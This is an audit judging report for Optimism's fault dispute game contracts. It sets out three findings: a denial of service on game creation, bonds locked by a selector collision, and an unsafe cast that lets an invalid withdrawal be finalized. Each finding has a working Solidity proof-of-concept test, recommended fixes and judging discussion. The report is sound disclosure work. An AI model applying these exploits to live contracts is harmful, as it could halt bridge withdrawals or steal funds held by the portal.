# Issue H-1: Fault game factory can be manipulated to DOS game type using malicious `l2BlockNumber` 

Source: https://github.com/sherlock-audit/2024-02-optimism-2024-judging/issues/90 

The protocol has acknowledged this issue.

## Found by 
0xdeadbeef, GalloDaSballo, Trust, bin2chen, ctf\_sec, fibonacci, nirohgo, obront, tallo, zigtur
## Summary

All new games are proven against the most recent L2 block number in the `ANCHOR_STATE_REGISTRY`. This includes requiring that the block number we are intending to prove is greater than the latest proven block number in the registry. Due to insufficient validations of the passed L2 block number, it is possible for a user to set the latest block to `type(uint256).max`, blocking all possible future games from being initialized.

## Vulnerability Detail

New games are created for a given root claim and L2 block number using the factory, by cloning the implementation of the specified game type and passing these values as immutable args (where `_extraData` is the L2 block number).
```solidity
proxy_ = IDisputeGame(address(impl).clone(abi.encodePacked(_rootClaim, parentHash, _extraData)));
proxy_.initialize{ value: msg.value }();
```
As a part of the initialize function, we pull the latest confirmed `root` and `rootBlockNumber` from the `ANCHOR_STATE_REGISTRY`. These will be used as the "starting points" for our proof. In order to confirm they are valid starting points, we require that the L2 block number we passed is greater than the last proven root block number.
```solidity
(Hash root, uint256 rootBlockNumber) = ANCHOR_STATE_REGISTRY.anchors(GAME_TYPE);

// Should only happen if this is a new game type that hasn't been set up yet.
if (root.raw() == bytes32(0)) revert AnchorRootNotFound();

// Set the starting output root.
startingOutputRoot = OutputRoot({ l2BlockNumber: rootBlockNumber, root: root });

// Do not allow the game to be initialized if the root claim corresponds to a block at or before the
// configured starting block number.
if (l2BlockNumber() <= rootBlockNumber) revert UnexpectedRootClaim(rootClaim());
```
However, the L2 block number we pass does not appear to be sufficiently validated. If we look at the Fault Dispute Game, we can see that disputed L2 block number passed to the oracle is calculated using the `_execLeafIdx` and does not make any reference to the L2 block number passed via `extraData`:
```solidity
uint256 l2Number = startingOutputRoot.l2BlockNumber + disputedPos.traceIndex(SPLIT_DEPTH) + 1;

oracle.loadLocalData(_ident, uuid.raw(), bytes32(l2Number << 0xC0), 8, _partOffset);
```
This allows us to pass an L2 block number that is disconnected from the proof being provided.

After the claim is resolved, we update the `ANCHOR_STATE_REGISTRY` to include our new root by calling `tryUpdateAnchorState()`.
```solidity
function tryUpdateAnchorState() external {
    // Grab the game and game data.
    IFaultDisputeGame game = IFaultDisputeGame(msg.sender);
    (GameType gameType, Claim rootClaim, bytes memory extraData) = game.gameData();

    // Grab the verified address of the game based on the game data.
    // slither-disable-next-line unused-return
    (IDisputeGame factoryRegisteredGame,) =
        DISPUTE_GAME_FACTORY.games({ _gameType: gameType, _rootClaim: rootClaim, _extraData: extraData });

    // Must be a valid game.
    require(
        address(factoryRegisteredGame) == address(game),
        "AnchorStateRegistry: fault dispute game not registered with factory"
    );

    // No need to update anything if the anchor state is already newer.
    if (game.l2BlockNumber() <= anchors[gameType].l2BlockNumber) {
        return;
    }

    // Must be a game that resolved in favor of the state.
    if (game.status() != GameStatus.DEFENDER_WINS) {
        return;
    }

    // Actually update the anchor state.
    anchors[gameType] = OutputRoot({ l2BlockNumber: game.l2BlockNumber(), root: Hash.wrap(game.rootClaim().raw()) });
}
```
As long as the L2 block number we passed is greater than the last proven one, we update it with our new root. This allows us to set the `ANCHOR_STATE_REGISTRY` to contain an arbitrarily high `blockRootNumber`.

If we were to pass `type(uint256).max` as this value, it would be set in the `anchors` mapping, and would cause all other games to fail to initialize, because there is no value they could pass for the L2 block number that would be greater, and would therefore fail the check described above.

## Proof of Concept

The following test can be dropped into `DisputeGameFactory.t.sol` to demonstrate the vulnerability:
```solidity
function testZach_DOSWithMaxBlockNumber(uint256 newBlockNum) public {
    // propose a root with a block number of max uint256
    bytes memory maxBlock = abi.encode(type(uint256).max);
    IDisputeGame game = disputeGameFactory.create(GameType.wrap(0), Claim.wrap(bytes32(uint(1))), maxBlock);
    assertEq(game.l2BlockNumber(), type(uint256).max);

    // when the game passes, it's saved in the anchor registry
    vm.warp(block.timestamp + 4 days);
    game.resolveClaim(0);
    game.resolve();

    // now we can fuzz newly proposed block numbers, and all fail for the same reason
    bytes memory maxBlock2 = abi.encode(newBlockNum);
    vm.expectRevert(abi.encodeWithSelector(UnexpectedRootClaim.selector, 1));
    disputeGameFactory.create(GameType.wrap(0), Claim.wrap(bytes32(uint(1))), maxBlock2);
}
```

## Impact

For no cost, the factory can be DOS'd from creating new games of a given type.

## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L528-L539

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/AnchorStateRegistry.sol#L59-L87

## Tool used

Manual Review

## Recommendation

In order to ensure that ordering does not need to be preserved, `ANCHOR_STATE_REGISTRY` should store a mapping of claims to booleans. This would allow users to prove against any proven state, instead of being restricted to proving against the latest state, which could be manipulated.



## Discussion

**smartcontracts**

Factually valid although the impact here isn't different than having any game resolve incorrectly which would poison the `AnchorStateRegistry` and require the game type to be changed.

**nevillehuang**

Based on scoping details below, I believe this issue is valid and in-scope of the contest, as the root cause stems from the lack of a sanity check within the dispute game factory allowing large `l2BlockNumber` to be appended

https://docs.google.com/document/d/1xjvPwAzD2Zxtx8-P6UE69TuoBwtZPbpwf5zBHAvBJBw/edit

The potential to block the entire fault proofs system entirely by preventing further creation of new games is significant, so I believe it warrants high severity given the potential to block withdrawals from an OP bridge. Although the admin can temporarily resolve this by switching game type, I believe it is not a valid solution given the attack can be easily repeated.

# Issue M-1: claimCredit() user may not be able to claim bond 

Source: https://github.com/sherlock-audit/2024-02-optimism-2024-judging/issues/43 

## Found by 
bin2chen
## Summary
`FaultDisputeGame` is created through `ClonesWithImmutableArgs`. 
Under the mechanism of `ClonesWithImmutableArgs`, every method execution automatically appends `ImmutableArgs` to the `calldata`. 
As a result, the `calldata` is never empty. 
So, if the first parameter of `ImmutableArgs`, namely `rootClaim`, happens to match the first 4 bytes of another contract's method signature
 it can lead to unexpected behavior. 
Example, when executing `address(FaultDisputeGame).transfer()`, instead of invoking the expected `fallback()` function, it may inadvertently trigger another method, causing the `transfer()` operation to fail. 
Currently, this issue affects the `FaultDisputeGame.claimCredit()` method, preventing users from retrieving their bond.
`claimCredit()` -> `DelayedWETH.withdraw()` -> `WETH98.withdraw()` -> `payable(msg.sender).transfer(wad);`.

## Vulnerability Detail
When `FaultDisputeGame` is cloned, it specifies `ImmutableArgs = abi.encodePacked(_rootClaim, parentHash, _extraData)`. Under the mechanism of `ClonesWithImmutableArgs`, every method execution automatically appends this `ImmutableArgs`. 
Due to this automatic appending, consider the scenario where we execute `address(FaultDisputeGame).transfer()`. 
The actual `calldata` would be: `["" + 0x20 root claim + 0x20 parentHash + 0x20 extraData + 0x02 CWIA bytes]`. 
Consequently, the `first 4 bytes` of `rootClaim` might be mistakenly interpreted as a method selector. 
If it coincidentally matches an existing contract's method signature, it could lead to unintended behavior, resulting in a revert due to `OUT GAS` or  `payable error`  or an `abi error`
```solidity
gameType() = 0xbbdc02db
resolve(..) = 0x2810e1d6
resolveClaim(..)=0xfdffbb28
...
...
...
other function
```

The current execution steps of `FaultDisputeGame.claimCredit()` are as follows:
`claimCredit()`->`DelayedWETH.withdraw()`->`WETH98.withdraw()`->`payable(msg.sender).transfer(wad);`
```solidity
contract WETH98 is IWETH {
...
    function withdraw(uint256 wad) public virtual {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
@>      payable(msg.sender).transfer(wad);   // will revert if have Special rootClaim
        emit Withdrawal(msg.sender, wad);
    }
```

## POC
The following code demonstrates that the  `first 4 bytes`  of `rootClaim` is  `gameType()`.
`transfer()` will execute the `function gameType () `

```solidity
contract CounterTest is Test {
  using ClonesWithImmutableArgs for address;
  receive() external payable { }
  fallback() external payable { }
  function gameType() external{
  }
  function test() external {
    bytes memory b = abi.encodeWithSignature("gameType()","xxx","xxx");
    bytes32 rootClaim;
    assembly {
      rootClaim :=mload(add(b,0x20)) //bytes to bytes32
    }
    CounterTest clone = CounterTest(address(this).clone(abi.encodePacked(rootClaim,blockhash(block.number - 1),uint256(123))));
    vm.deal(address(this), 1 ether);
    payable(clone).transfer(10);
  }
}
```

```console
$ forge test -vvv

Traces:
  [73684] CounterTest::test()
    ├─ [30246] → new <unknown>@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← 151 bytes of code
    ├─ [0] VM::deal(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18])
    │   └─ ← ()
    ├─ [338] 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f::fallback{value: 10}()
    │   ├─ [145] CounterTest::gameType() [delegatecall]
    │   │   └─ ← EvmError: Revert
    │   └─ ← EvmError: Revert
    └─ ← EvmError: Revert
```


## Impact

The number of `rootClaim`  and the number of `FaultDisputeGame` public function are still relatively large, and there is still a certain chance that there will be a special `first 4 bytes`
This will cause the user's bond to be locked

Another possible malicious user can also maliciously specify a special `rootClaim`, causing other challengers to lose the submitted `bond`, but the user agrees to lose `eth`
## Code Snippet
https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L641
## Tool used

Manual Review

## Recommendation

Modify `withdraw (address _guy, uint256 _wad)` do not transfer to `game` and then to `gun`, but directly to `guy`
```diff
    function claimCredit(address _recipient) external {
...
        WETH.withdraw(_recipient, recipientCredit);

-       // Transfer the credit to the recipient.
-       (bool success,) = _recipient.call{ value: recipientCredit }(hex"");
-       if (!success) revert BondTransferFailed();
    }

contract DelayedWETH is OwnableUpgradeable, WETH98, IDelayedWETH, ISemver {
...

    function withdraw(address _guy, uint256 _wad) public {
        require(!config.paused(), "DelayedWETH: contract is paused");
        WithdrawalRequest storage wd = withdrawals[msg.sender][_guy];
        require(wd.amount >= _wad, "DelayedWETH: insufficient unlocked withdrawal");
        require(wd.timestamp > 0, "DelayedWETH: withdrawal not unlocked");
        require(wd.timestamp + DELAY_SECONDS <= block.timestamp, "DelayedWETH: withdrawal delay not met");
        wd.amount -= _wad;
-       super.withdraw(_wad);
+       require(balanceOf[msg.sender] >= wad);
+       balanceOf[msg.sender] -= wad;
+       payable(_guy).transfer(wad);
+       emit Withdrawal(msg.sender, wad);
    }
```



## Discussion

**smartcontracts**

We believe this to be a valid issue that would be out of scope of this contest because it pertains to the FaultDisputeGame resolution logic (see "Please list any known issues/acceptable risks that should not result in a valid finding" section in the Q&A). However, because we've noted some ambiguity in the intended phrasing of the Q&A, we would like to reward this report outside of this contest. We are currently coordinating to determine reward amounts and which platform will be used to distribute the reward.

**sherlock-admin4**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/ethereum-optimism/optimism/pull/10064


**nevillehuang**

@smartcontracts I wouldn't call this related to resolution logic actually. This issue is dependent on a unsuspecting faulty creation of an FDG via the factory contract (non-game contract), which automatically makes all new FDG games possibly vulnerable. I believe medium severity is appropriate due to very specific conditions required based on scoping details here:

https://docs.google.com/document/d/1xjvPwAzD2Zxtx8-P6UE69TuoBwtZPbpwf5zBHAvBJBw/edit

# Issue M-2: Incorrect game type can be proven and finalized due to unsafe cast 

Source: https://github.com/sherlock-audit/2024-02-optimism-2024-judging/issues/84 

## Found by 
Stiglitz, guhu95, lemonmon, obront
## Summary

The `gameProxy.gameType().raw()` conversions used by OptimismPortal2 in the proving and finalization steps incorrectly casts the `gameType` to a `uint8` instead of a `uint32`, which causes mismatched game types to be considered equivalent. In the event that a game is exploitable, this can be used to skirt around the off-chain monitoring to finalize an invalid withdrawal.

## Vulnerability Detail

Each game can be queried for its `gameType`, which is compared to the current `respectedGameType` in the Portal to confirm the game is valid.

GameType is represented as a `uint32`, allowing numbers up to `2 ** 32 - 1`.
```solidity
type GameType is uint32;
```

However, when converting the GameType to an integer type in order to perform comparisons in the proving and finalization process, we unsafely downcase to a `uint8`:
```solidity
function raw(GameType _gametype) internal pure returns (uint8 gametype_) {
    assembly {
        gametype_ := _gametype
    }
}
```

This means that for any `oldGameType % 256 == X`, any `newGameType % 256 == X` will be considered the same game type.

**This has the potential to shortcut the safeguards to allow malicious games to be finalized.**

As is explained in the comments, only games of the current `respectedGameType` will be watched by the off-chain challenger. This is why we do not allow games that pre-date the last update to be finalized:

> // The game must have been created after `respectedGameTypeUpdatedAt`. This is to prevent users from creating
> // invalid disputes against a deployed game type while the off-chain challenge agents are not watching.

However, the watcher will not be watching games where `gameType % 256 == respectedGameType % 256`.

Let's imagine a situation where game type `0` has been deemed unsafe. It is well known that a user can force a `DEFENDER_WINS` state, even when it is not correct.

At a future date, when the current game type is `256`, a user creates a game with `gameType = 0`. It is not watched by the off chain challenger. This game can be used to prove an invalid state, and then finalize their withdrawal, all while not being watched by the off chain monitoring system.

## Proof of Concept

The following proof of concept can be added to  its own file in `test/L1` to demonstrate the vulnerability:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import "./OptimismPortal2.t.sol";

contract UnsafeDowncastTest is CommonTest {
    // Reusable default values for a test withdrawal
    Types.WithdrawalTransaction _defaultTx;
    bytes32 _stateRoot;
    bytes32 _storageRoot;
    bytes32 _outputRoot;
    bytes32 _withdrawalHash;
    bytes[] _withdrawalProof;
    Types.OutputRootProof internal _outputRootProof;

    // Use a constructor to set the storage vars above, so as to minimize the number of ffi calls.
    function setUp() public override {
        super.enableFaultProofs();
        super.setUp();

        _defaultTx = Types.WithdrawalTransaction({
            nonce: 0,
            sender: alice,
            target: bob,
            value: 100,
            gasLimit: 100_000,
            data: hex""
        });
        // Get withdrawal proof data we can use for testing.
        (_stateRoot, _storageRoot, _outputRoot, _withdrawalHash, _withdrawalProof) =
            ffi.getProveWithdrawalTransactionInputs(_defaultTx);

        // Setup a dummy output root proof for reuse.
        _outputRootProof = Types.OutputRootProof({
            version: bytes32(uint256(0)),
            stateRoot: _stateRoot,
            messagePasserStorageRoot: _storageRoot,
            latestBlockhash: bytes32(uint256(0))
        });

        // Fund the portal so that we can withdraw ETH.
        vm.deal(address(optimismPortal2), 0xFFFFFFFF);
    }

    function testWrongGameTypeSucceeds() external {
        // we start with respected gameType == 256
        vm.prank(superchainConfig.guardian());
        optimismPortal2.setRespectedGameType(GameType.wrap(256));

        // create a game with gameType == 0, which we know is exploitable
        FaultDisputeGame game = FaultDisputeGame(
            payable(
                address(
                    disputeGameFactory.create(
                        GameType.wrap(0), Claim.wrap(_outputRoot), abi.encode(uint(0xFF))
                    )
                )
            )
        );

        // proving works, even though gameType is incorrect
        vm.warp(block.timestamp + 1);
        optimismPortal2.proveWithdrawalTransaction({
            _tx: _defaultTx,
            _disputeGameIndex: disputeGameFactory.gameCount() - 1,
            _outputRootProof: _outputRootProof,
            _withdrawalProof: _withdrawalProof
        });

        // warp beyond the game duration and resolve the game
        vm.warp(block.timestamp + 4 days);
        game.resolveClaim(0);
        game.resolve();

        // warp another 4 days so withdrawal can be finalized
        vm.warp(block.timestamp + 4 days);

        // finalizing works, even though gameType is incorrect
        uint beforeBal = bob.balance;
        optimismPortal2.finalizeWithdrawalTransaction(_defaultTx);
        assertEq(bob.balance, beforeBal + 100);
    }
}
```

## Impact

The user is able to prove and finalize their withdrawal against a game that is not being watched and is known to be invalid. This would allow them to prove arbitrary withdrawals and steal all funds in the Portal.

## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/lib/LibUDT.sol#L117-L126

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/L1/OptimismPortal2.sol#L260-L261

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/L1/OptimismPortal2.sol#L497-L500

## Tool used

Manual Review

## Recommendation

```diff
- function raw(GameType _gametype) internal pure returns (uint8 gametype_) {
+ function raw(GameType _gametype) internal pure returns (uint32 gametype_) {
      assembly {
          gametype_ := _gametype
      }
}
```



## Discussion

**smartcontracts**

We see this as a valid medium severity issue

**sherlock-admin4**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/ethereum-optimism/optimism/pull/10152


**nevillehuang**

Based on scope highlighted below (issue exists and affects portal contract, which is a non-game contract) and [sherlock scoping rules](https://docs.sherlock.xyz/audits/judging/judging#iii.-sherlocks-standards)

https://docs.google.com/document/d/1xjvPwAzD2Zxtx8-P6UE69TuoBwtZPbpwf5zBHAvBJBw/edit

> 2. In case the vulnerability exists in a library and an in-scope contract uses it and is affected by this bug this is a valid issue.

I believe this is a medium severity issue given the following constraints:

- At least 256 games must exist in a single game type
- This issue doesn't bypass the airgap/Delayed WETH safety net, so can still be monitored off-chain to trigger a fallback mechanism to pause the system and update the respected game type if a game resolves incorrectly. 

